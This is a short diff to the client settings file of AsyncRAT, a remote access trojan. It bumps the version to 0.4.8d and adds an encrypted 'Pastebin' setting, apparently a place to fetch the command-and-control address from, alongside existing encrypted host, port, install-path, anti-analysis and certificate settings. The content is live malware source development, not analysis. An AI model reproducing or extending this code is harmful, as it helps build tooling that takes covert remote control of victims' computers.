@@ -12,7 +12,7 @@ namespace Client
 #if DEBUG
         public static string Ports = "6606";
         public static string Hosts = "127.0.0.1";
-        public static string Version = "AsyncRAT 0.4.7";
+        public static string Version = "AsyncRAT 0.4.8d";
         public static string Install = "false";
         public static string ClientFullPath = Path.Combine(Environment.ExpandEnvironmentVariables("%AppData%"), "Payload.exe");
         public static string Key = "NYAN CAT";
@@ -22,10 +22,11 @@ namespace Client
         public static X509Certificate2 ServerCertificate;
         public static string Anti = "false";
         public static Aes256 aes256 = new Aes256(Key);
+        public static string Pastebin = "null";
 #else
         public static string Ports = "%Ports%";
         public static string Hosts = "%Hosts%";
-        public static string Version = "AsyncRAT 0.4.8B";
+        public static string Version = "AsyncRAT 0.4.8d";
         public static string Install = "%Install%";
         public static string ClientFullPath = Path.Combine(Environment.ExpandEnvironmentVariables("%Folder%"), "%File%");
         public static string Key = "%Key%";
@@ -35,6 +36,7 @@ namespace Client
         public static X509Certificate2 ServerCertificate;
         public static readonly string Anti = "%Anti%";
         public static Aes256 aes256;
+        public static string Pastebin = "%Pastebin%";
 #endif
 
 
@@ -49,6 +51,7 @@ namespace Client
                 aes256 = new Aes256(Key);
                 Ports = aes256.Decrypt(Ports);
                 Hosts = aes256.Decrypt(Hosts);
+                Pastebin = aes256.Decrypt(Pastebin);
                 Serversignature = aes256.Decrypt(Serversignature);
                 ServerCertificate = new X509Certificate2(Convert.FromBase64String(aes256.Decrypt(Certificate)));
                 return VerifyHash();
